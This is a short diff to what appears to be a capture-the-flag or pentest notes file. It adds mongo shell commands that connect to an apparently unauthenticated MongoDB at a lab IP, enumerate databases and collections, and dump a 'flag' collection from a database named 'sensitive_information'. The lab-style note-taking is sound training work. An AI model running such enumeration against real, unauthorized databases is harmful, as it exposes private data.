@@ -108,5 +108,9 @@ ____________________________________
 
 MONGODB Connect
 mongo mongodb://10.129.228.30:27017
+show dbs;
+use sensitive_information;
+show collections;
+db.flag.find().pretty();
 ____________________________________
 
